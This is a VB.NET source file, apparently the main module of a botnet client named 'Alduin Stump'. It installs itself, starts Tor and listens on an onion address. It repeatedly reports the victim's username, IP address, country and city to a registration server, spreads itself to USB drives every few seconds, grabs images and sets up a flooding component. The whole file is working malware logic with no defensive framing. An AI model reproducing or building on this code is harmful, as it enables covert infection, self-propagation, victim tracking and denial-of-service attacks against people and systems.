Imports System.IO
Imports System.Threading
Imports Alduin.Stump.Alduin.Stump.Class.Commands
Imports Alduin.Stump.Alduin.Stump.Class.Network
Imports Newtonsoft.Json

Module Main
    ReadOnly NewListener As New Thread(AddressOf Listener)
    ReadOnly NewNotice As New Thread(AddressOf Noticer)
    ReadOnly DelayedAction As New Thread(AddressOf DelayedActions)
    ReadOnly NewImageGraber As New Thread(AddressOf ImageGraber)
    ReadOnly NewDetecter As New Thread(AddressOf Detecter)
    Private _command As New CommandHandler
    Private _config As New ConfigBotModel
    Private _FloodsBase As Floodsbase
    Public Function GetFloodsBase()
        Return _FloodsBase
    End Function
    Private Sub SetFloodsBase(floodsbase As Floodsbase)
        _FloodsBase = floodsbase
    End Sub
    Public Property Config As ConfigBotModel
        Get
            Return _config
        End Get
        Set(value As ConfigBotModel)
            _config = value
        End Set
    End Property

    Public Property Command As CommandHandler
        Get
            Return _command
        End Get
        Set(value As CommandHandler)
            _command = value
        End Set
    End Property
    Public Property MainThreadCreateWebBrowserForm As WebBrowserForm
    <STAThread()>
    Public Sub Main()
        configBot()
        NewDetecter.Start()
        Install()
        StartTor()
        NewListener.Start()
        NewNotice.Start()
        DelayedAction.Start()
        Dim floodsbase As New Floodsbase
        SetFloodsBase(floodsbase)
        If Not File.Exists(GetConfigJson().MainPath & "\Images.txt") Then
            NewImageGraber.Start()
        End If
        MainThreadCreateWebBrowserForm = New WebBrowserForm
    End Sub
    Public Function GetWebrowser()
        Return MainThreadCreateWebBrowserForm
    End Function
    Public Sub Listener()
        If Config.Variables.Debug Then
            Console.WriteLine("Onion Address: " & GetOnionAddress())
            Console.WriteLine("Listening") 'Debugging
        End If
        Dim tcplistener As New TcpListen()
        While (True)
            tcplistener.TcpAsync()
        End While
    End Sub
    Public Sub Noticer()
        While (True)
            Dim model As New DefaultRegistrationModel With {
                .UserName = GetUsername(),
                .KeyUnique = GetConfigJson().KeyUnique,
                .KeyCertified = _config.Variables.CertifiedKey,
                .Domain = GetOnionAddress(),
                .CountryCode = GetCountyCode(GetMyIPAddress()),
                .LastIPAddress = GetMyIPAddress(),
                .City = GetCity(GetMyIPAddress())
            }
            Dim http As New SendHTTPonTor
            http.TalkChannelHTTP(model, _config.UrlVariables.RegistrationUrl)
            Thread.Sleep(SectoMs(200))
        End While
    End Sub
    Public Sub DelayedActions()
        While (True)
            USBSpreading(GetMainFile())
            Thread.Sleep(SectoMs(5))
        End While
    End Sub
    Public Sub configBot()
        Dim configjson = JsonConvert.DeserializeAnonymousType(File_reader("Config.json"), New ConfigBotModel)
        Config = configjson
    End Sub
End Module
